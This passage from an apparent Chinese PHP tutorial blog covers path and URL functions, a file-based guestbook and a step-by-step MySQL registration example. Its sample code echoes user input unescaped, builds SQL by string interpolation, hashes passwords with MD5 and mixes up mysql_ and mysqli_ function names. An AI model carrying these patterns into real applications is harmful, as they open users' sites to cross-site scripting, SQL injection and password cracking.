class="line">文件扩展名：php</span><br><span class="line">不包含扩展的文件名：lib.inc</span><br></pre></td></tr></table></figure>


<p>&emsp;</p>
<h4 id="10-2-basename-函数"><a href="#10-2-basename-函数" class="headerlink" title="10.2 basename()函数"></a><font color="#3CB371" face="Comic sans MS">10.2 basename()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回路径中不带有文件扩展名的文件名</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>basename(path[,suffix])</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_basename.asp">PHP basename() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">suffix</td>
<td align="left">可选。指定文件名到了指定字符停止。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1: &quot;</span>.basename(<span class="string">&quot;d:/www/index.d&quot;</span>, <span class="string">&quot;.d&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2: &quot;</span>.basename(<span class="string">&quot;d:/www/index.php&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3: &quot;</span>.basename(<span class="string">&quot;d:/www/passwd&quot;</span>).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line"><span class="number">1</span>: index</span><br><span class="line"><span class="number">2</span>: index.php</span><br><span class="line"><span class="number">3</span>: passwd</span><br></pre></td></tr></table></figure>


<p>&emsp;</p>
<h4 id="10-3-dirname-函数"><a href="#10-3-dirname-函数" class="headerlink" title="10.3 dirname()函数"></a><font color="#3CB371" face="Comic sans MS">10.3 dirname()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回文件路径的文件目录部份,不包含文件名。</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>dirname(path)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_dirname.asp">PHP dirname() 函数</a>]</font></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line">G:\WAMP\www</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="10-4-parse-url-函数"><a href="#10-4-parse-url-函数" class="headerlink" title="10.4 parse_url()函数"></a><font color="#3CB371" face="Comic sans MS">10.4 parse_url()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：将网址拆解成各个部份，返回一个数组</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>mixed parse_url ( string $路径 )</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"><span class="keyword">array</span>(<span class="number">8</span>) &#123;</span><br><span class="line">[<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">[<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;hostname&quot;</span></span><br><span class="line">[<span class="string">&quot;port&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">9090</span>)</span><br><span class="line">[<span class="string">&quot;user&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;username&quot;</span></span><br><span class="line">[<span class="string">&quot;pass&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;password&quot;</span></span><br><span class="line">[<span class="string">&quot;path&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;/path&quot;</span></span><br><span class="line">[<span class="string">&quot;query&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;arg=value&quot;</span></span><br><span class="line">[<span class="string">&quot;fragment&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&emsp;</p>
<h4 id="10-5-http-build-query-函数"><a href="#10-5-http-build-query-函数" class="headerlink" title="10.5 http_build_query()函数"></a><font color="#3CB371" face="Comic sans MS">10.5 http_build_query()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：生成url 中的query字符串</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>string http_build_query ( mixed $需要处理的数据)</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个关联数组</span></span><br><span class="line">$data = [</span><br><span class="line">       <span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;area&#x27;</span>=&gt;<span class="string">&#x27;hubei&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成query内容</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">username=php&amp;area=hubei</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注：</strong>PHP_EOL 常量<br>在 windows平台相当于 echo “\r\n”;<br>在unix\linux平台相当于 echo “\n”;<br>在mac平台相当于 echo “\r”;</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h3 id="十一-文件系统实例案例"><a href="#十一-文件系统实例案例" class="headerlink" title="十一. 文件系统实例案例"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统实例案例</font></h3><h4 id="11-1-文件留言本"><a href="#11-1-文件留言本" class="headerlink" title="11.1 文件留言本"></a><font color="#3CB371" face="Comic sans MS">11.1 文件留言本</font></h4><p>先来说两个下面用到的两个字符串函数和一个数组函数：</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_trim.asp"><strong>trim()函数</strong></a>]</font>：<strong>移除字符串两侧的空白字符或其他预定义字符。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp"><strong>explode()函数</strong></a>]</font><strong>：把字符串打散为数组。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp"><strong>each()函数</strong></a>]</font><strong>：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。</strong></p>
<p><font color="#FF7F00"></font></p>
<p>&emsp;<br><font color="#00B2EE">[<a href="http://www.php.cn/code/4934.html"><strong>视频教程</strong></a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>1. 文件结构：</strong></font><br>index.php —展示输入框和留言内容,并将内容提交到write.php；<br>write.php —接收并处理来自index.php的内容，然后向message.txt写入数据；<br>message.txt —接收并存入来自write.php的聊天内容。</p>
</blockquote>
<p>index.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line"><span class="comment">//设置时区</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;PRC&#x27;</span>);</span><br><span class="line"><span class="comment">//读了内容</span></span><br><span class="line">@$string = file_get_contents(<span class="string">&#x27;message.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($string)) &#123;</span><br><span class="line">    <span class="comment">//每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span></span><br><span class="line">    $string = rtrim($string, <span class="string">&#x27;&amp;^&#x27;</span>);</span><br><span class="line">    <span class="comment">//以&amp;^切成数组</span></span><br><span class="line">    $arr = explode(<span class="string">&#x27;&amp;^&#x27;</span>, $string);</span><br><span class="line">    <span class="comment">//将留言内容读取</span></span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="comment">//将用户名和内容分开</span></span><br><span class="line">        <span class="keyword">list</span>($username, $content, $time) = explode(<span class="string">&#x27;$#&#x27;</span>, $value);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27;</span> . $username . <span class="string">&#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27;</span> . $content . <span class="string">&#x27;&lt;/font&gt;时间为&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, $time);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;write.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=<span class="string">&quot;content&quot;</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>write.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//追加方式打开文件</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;message.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置时间</span></span><br><span class="line">$time=time();</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到用户名</span></span><br><span class="line">$username=trim($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="comment">//得到内容</span></span><br><span class="line">$content=trim($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//组合写入的字符串：内容和用户之间分开，使用$#</span></span><br><span class="line"><span class="comment">//行与行之间分开，使用&amp;^</span></span><br><span class="line">$string=$username.<span class="string">&#x27;$#&#x27;</span>.$content.<span class="string">&#x27;$#&#x27;</span>.$time.<span class="string">&#x27;&amp;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">fwrite($fp,$string);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#00B2EE"><strong>步骤1：</strong></font><strong>在www目录下的index.php里面复制上面相对应的内容、新建一个write.php文件并复制相应的内容、新建一个message.txt空文件；</strong><br><font color="#00B2EE"><strong>步骤2：</strong></font><strong>运行index.php如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/21/5c6e21be78910.png" alt="Hash函数.png"></p>
<p>&emsp;<br><font color="#00B2EE"><strong>步骤3：</strong></font><strong>向留言框输入文字并点击提交</strong></p>
<p>&emsp;</p>
<h4 id="11-2-修改配置文件"><a href="#11-2-修改配置文件" class="headerlink" title="11.2 修改配置文件"></a><font color="#3CB371" face="Comic sans MS">11.2 修改配置文件</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/code/4935.html"><strong>视频教程</strong></a>]</font><br>&emsp;</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP操作MySQL数据库</title>
    <url>/post/PHP-MySQL/</url>
    <content><![CDATA[<p>😁</p>
<a id="more"></a>
<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP操作MySQL数据库</font></center>



<p>&emsp;<br>&emsp;</p>
<h3 id="一-数据库连接步骤"><a href="#一-数据库连接步骤" class="headerlink" title="一. 数据库连接步骤"></a><font color="#FF6347" face="Comic sans MS">一. 数据库连接步骤</font></h3><p>将数据库连接整理成了最重要的<font color="#FF7F00"><strong>8个步骤</strong></font>，我戏称它为：“数据库连接天龙八步”。😊  (。・∀・)ノ</p>
<p>&emsp;</p>
<h4 id="第一步-连接数据库服务器"><a href="#第一步-连接数据库服务器" class="headerlink" title="第一步:  连接数据库服务器"></a><font color="#3CB371" face="Comic sans MS">第一步:  连接数据库服务器</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_connect.asp">PHP mysql_connect() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_connect()</td>
</tr>
<tr>
<td align="center">函数原型</td>
<td align="left">mysql_connect(server,user,pwd,newlink,clientflag)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">连接到mysql数据库服务器</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则返回一个 MySQL 连接标识，失败则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">主机</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">数据库服务器登陆名</td>
</tr>
<tr>
<td align="center">参数3</td>
<td align="left">密码</td>
</tr>
<tr>
<td align="center">参数4</td>
<td align="left">数据库的名称</td>
</tr>
<tr>
<td align="center">参数5</td>
<td align="left">数据库服务器端口不填默认3306</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>对于参数4，数据库名称在此步已填并择，不需要执行第三步。</strong></font></p>
</blockquote>
<p>&emsp;</p>
<h4 id="第二步-判断错误"><a href="#第二步-判断错误" class="headerlink" title="第二步:  判断错误"></a><font color="#3CB371" face="Comic sans MS">第二步:  判断错误</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_errno.asp">PHP mysqli_errno() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_errno(connection)</td>
</tr>
<tr>
<td align="center">功能/返回值</td>
<td align="left">返回连接错误号，无错误返回0</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect()返回的资源可选。规定 SQL 连接标识符。如果未规定，则使用上一个<br>打开的连接。</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="#FF7F00"><strong>如果mysqli_errno()函数返回错误号，则用mysqli_error()显示文本错误信息。</strong></font>&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_error.asp">PHP mysql_error() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_error(connection)</td>
</tr>
<tr>
<td align="center">功能/返回值</td>
<td align="left">返回连接错误字符串，如果没有出错则返回 ‘’（空字符串）</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="第三步-选择数据库"><a href="#第三步-选择数据库" class="headerlink" title="第三步:  选择数据库"></a><font color="#3CB371" face="Comic sans MS">第三步:  选择数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_select_db.asp">PHP mysqli_select_db() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysql_selecti_db(connection,database)</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则该函数返回 true。如果失败，则返回 false。</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">选择本连接中的<strong>数据库</strong></td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">需要连接的数据库名</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>若在第一步已填数据库，不需要更换成其他数据库，则不需要执行第三步。</strong></font></p>
</blockquote>
<p>&emsp;</p>
<h4 id="第四步-设置字符集"><a href="#第四步-设置字符集" class="headerlink" title="第四步:  设置字符集"></a><font color="#3CB371" face="Comic sans MS">第四步:  设置字符集</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-mysqli-set-charset.html">PHP mysqli_set_charset 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_set_charset(connection,charset)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">设置与mysql服力器连接，结果，校验字符集</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">无返回值</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">字符集类型</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="第五步-准备SQL语句"><a href="#第五步-准备SQL语句" class="headerlink" title="第五步:  准备SQL语句"></a><font color="#3CB371" face="Comic sans MS">第五步:  准备SQL语句</font></h4><p><font color="#FF7F00"><strong>其实就是一个SQL语句的字符串，用于对MySQL数据库的操作。这一步很重要！</strong></font> </p>
<p>&emsp;<br>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sql = <span class="string">&quot;insert into user(username,password) values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">$con = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>我们通常要把变量赋值在SQL语句中使用。可是变量或者SQL语句出错了，非常不好排查。</li>
<li>我们根据实际工作经验增加了这一步。</li>
<li>如果在执行此步的时候报错了，我们可以把SQL语句打印出来，粘贴到phpMyAdmin或者相关工具中。</li>
<li>排错时，如果执行成功就说明不是SQL语句的问题。如果执行失败，请仔细检查SQL语句。</li>
</ol>
</blockquote>
<p>&emsp;</p>
<h4 id="第六步-发送SQL语句"><a href="#第六步-发送SQL语句" class="headerlink" title="第六步:  发送SQL语句"></a><font color="#3CB371" face="Comic sans MS">第六步:  发送SQL语句</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_query.asp">PHP mysqli_query() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">功能</td>
<td align="left">发送SQL语句,执行一条 MySQL 查询。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">mysqli_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句<strong>返回一个资源标识符</strong>，<br>如果查询执行不正确则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">传入发送的SQL语句。注意：查询字符串不应以分号结束。</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>SQL语句准备完成，需要通过mysqli_query将SQL语句发送给MySQL服务器。</li>
<li>MySQL服务器会执行发送过来的SQL语句进行执行。</li>
</ol>
</blockquote>
<p>&emsp;</p>
<h4 id="第七步-判断是否执行正常或者遍历数据"><a href="#第七步-判断是否执行正常或者遍历数据" class="headerlink" title="第七步:  判断是否执行正常或者遍历数据"></a><font color="#3CB371" face="Comic sans MS">第七步:  判断是否执行正常或者遍历数据</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_fetch_array.asp">PHP mysqli_fetch_array() 函数</a>]</font><br>读取第6步中，发送的是select类别的语句，<font color="#FF7F00"><strong>通常需要将结果以数组形式输出显示出来</strong></font>。就需要用到遍历显示数据的函数。</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_fetch_array(data,array_type)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">得到result结果集中的数据，返回数组进行遍历</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">可选。规定要使用的数据指针。该数据指针是 mysqli_query() 函数产生的结果。</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">可选。规定返回哪种结果。可能的值：<br>MYSQL_ASSOC - 关联数组<br>MYSQL_NUM - 数字数组<br>MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody></table>
<p>&emsp;<br>下面举例几个常用的<strong>将mysqli_query()查询得到的字符串处理成数组的函数</strong>…….</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysqli_fetch_assoc(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>关联数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_row(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>索引数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_object(data)</td>
<td align="left">从结果集（记录集）中取得一行作为对象。<br>若成功的话，本函数从 mysql_query() 获得一行，并返回一个对象。如果失败<br>或没有更多的行，则返回 false。</td>
</tr>
<tr>
<td align="center">mysqli_num_rows(data)</td>
<td align="left">返回结果集中行的数目。此命令仅对 SELECT 语句有效。<br>要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，<br>用 mysqli_affected_rows()。</td>
</tr>
<tr>
<td align="center">mysqli_fetch_field</td>
<td align="left">从结果集中取得列信息并作为对象返回。</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h4 id="第八步-关闭数据库"><a href="#第八步-关闭数据库" class="headerlink" title="第八步:  关闭数据库"></a><font color="#3CB371" face="Comic sans MS">第八步:  关闭数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_close.asp">PHP mysql_close() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_close(link_identifier)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">关闭数据库连接</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功则返回 true，失败则返回 false。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="red" face="Comic sans MS"><strong>其他：显示服务器信息函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_info</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器信息</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_version</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器版本</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>mysqli只学过程化的方法即可。在面向对象阶段实际工作中完全抛弃了mysqli的对象用法，而是使用的是PDO对象连接数据库的方式。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h3 id="二-通过步骤做一个用户注册实例"><a href="#二-通过步骤做一个用户注册实例" class="headerlink" title="二. 通过步骤做一个用户注册实例"></a><font color="#FF6347" face="Comic sans MS">二. 通过步骤做一个用户注册实例</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们做一个最简单的注册页面。注册页面中有三个参数：</strong></font></p>
</blockquote>
<ol>
<li>用户名</li>
<li>密码</li>
<li>重复密码</li>
</ol>
<ul>
<li>用户写好三个参数后，点击提交的时候向<code>connect.php</code>页面中传入POST记录。</li>
<li>我们可以把<code>POST记录</code>处理后写入到MySQL数据库中，即完成了用户注。</li>
</ul>
<blockquote>
<p><font color="#FF7F00"><strong>本例用到的两个文件：</strong></font></p>
</blockquote>
<ol>
<li><code>index.php</code>：表单页面；</li>
<li><code>connect.php</code>：处理表单的页面。</li>
</ol>
<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>一、 判断重复密码：</strong></font></p>
<blockquote>
<p>1.<strong>由于有重复密码，</strong><font color="#FF7F00"><strong>如果用户两次输入的密码不一致也就是有没有进行下一步的任何意义。</strong></font><br>2.<font color="#FF7F00"><strong>在网页中很多地方还是使用到了重复密码。</strong></font><strong>因为，害怕的是用户产生手误。将密码填写出错。</strong><br>3.<font color="#FF7F00"><strong>用户在输入密码的时候可能在左右两边多打两个空格。因此，我们会使用trim将密码和重复密码的两边去掉空格。</strong></font></p>
</blockquote>
<p>&emsp;<br>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(trim($_POST[<span class="string">&#x27;password&#x27;</span>]) != trim($_POST[<span class="string">&#x27;repassword&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>二、 准备好写入的数据：</strong></font><br>我们需要把用户的<strong>输入数据</strong>和<strong>隐藏的数据</strong>都写入到数据库。</p>
<p><font color="red"><strong>可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_POST[‘username’]</td>
<td align="left">用户名</td>
</tr>
<tr>
<td align="center">$_POST[‘password’]</td>
<td align="left">密码</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>我们需要把用户名去掉两边的空格，这样避免输入不必要的这些信息。</li>
<li>在mysql这一章节我们讲过，用户的密码不要让包括公司内部人员可见。保证密码是不可逆向的。在初级阶段大家学习一下MD5即可。以后我们再教大家其他的加密方式。</li>
</ol>
</blockquote>
<p><font color="red"><strong>不可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$time</td>
<td align="left">用户的注册时间</td>
</tr>
<tr>
<td align="center">$_SERVER[‘REMOTE_ADDR’]</td>
<td align="left">用户的注册IP</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>time返回的unix时间戳</li>
<li>REMOTE_ADDR返回的是IP地址，我们可以用ip2long将其转为整型存储。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = trim($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = md5(trim($_POST[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line">$time = time();</span><br><span class="line">$ip = ip2long($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、连接数据库、判断错误、选择库和字符集：</strong></font></p>
<blockquote>
<ol>
<li>我们使用mysqli_connect连接到数据库服务器。</li>
<li>如果有错误，使用mysqli_errno得到错误号</li>
<li>如何时存在错误mysqli_error打印出所有的错误，并且退出程序执行</li>
<li>选择数据库并且设置字符集为utf8.</li>
</ol>
</blockquote>
